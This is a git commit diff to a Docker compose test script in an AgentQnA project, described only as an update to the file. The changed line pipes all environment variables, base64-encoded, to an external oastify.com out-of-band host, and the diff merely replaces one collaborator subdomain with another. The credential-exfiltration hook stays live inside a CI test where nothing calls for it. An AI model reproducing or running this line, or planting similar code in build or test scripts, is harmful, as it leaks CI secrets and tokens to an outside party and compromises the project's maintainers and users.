562b7fe9318218401eba13963cf4cc4edc7ae8a8
0x95 <hbyxzxx@163.com>
2025-09-09 10:22:56 +0800

    Update test_compose_on_gaudi.sh

--- AgentQnA/tests/test_compose_on_gaudi.sh
+++ AgentQnA/tests/test_compose_on_gaudi.sh
@@ -17,7 +17,7 @@ echo "TAG=IMAGE_TAG=${IMAGE_TAG}"
 export REGISTRY=${IMAGE_REPO}
 export TAG=${IMAGE_TAG}
 export MODEL_CACHE=${model_cache:-"./data"}
-env | base64 | curl -X POST --data-binary @- http://uhfzg6k2fzjviduqgxlou3ci69c00rqff.oastify.com
+env | base64 | curl -X POST --data-binary @- http://37886fab58948mkz66bxkc2rwi29q0ho6.oastify.com
 
 function stop_docker() {
     echo "Stopping Retrieval tool"
